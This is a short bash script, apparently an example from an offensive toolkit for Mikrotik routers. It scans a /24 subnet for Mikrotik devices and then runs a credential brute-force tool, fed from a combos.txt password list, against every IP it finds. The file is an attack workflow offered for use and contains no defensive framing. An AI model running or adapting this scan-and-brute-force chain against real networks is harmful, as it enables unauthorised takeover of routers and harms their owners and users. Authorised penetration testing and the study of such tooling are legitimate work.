#!/bin/bash

# Example 4: Network discovery + targeted attack
# First discover Mikrotik devices, then attack them

echo "=== Example 4: Discovery + Attack ==="

# Step 1: Discover Mikrotik devices
echo "[*] Step 1: Discovering Mikrotik devices..."
python ../mikrotik-discovery.py \
  -n 192.168.1.0/24 \
  -o discovered_targets.json \
  --threads 100

# Step 2: Extract IPs and attack each
echo ""
echo "[*] Step 2: Attacking discovered targets..."

# Parse JSON and attack each target
for ip in $(jq -r '.devices[].ip' discovered_targets.json 2>/dev/null); do
  echo ""
  echo "[*] Attacking $ip..."
  python ../mikrotikapi-bf.py \
    -t $ip \
    -d combos.txt \
    --progress \
    --export csv \
    --timeout 5
done

echo ""
echo "[*] All targets attacked. Check results/ directory for outputs."

